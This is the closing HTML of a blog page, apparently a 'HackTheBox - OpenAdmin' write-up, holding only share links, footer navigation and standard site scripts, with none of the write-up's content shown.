  <li><a class="icon" href="mailto:?subject=HackTheBox - OpenAdmin 📦&body=Check out this article: https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&name=HackTheBox - OpenAdmin 📦&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&t=HackTheBox - OpenAdmin 📦"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Information Security &#64; Medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>

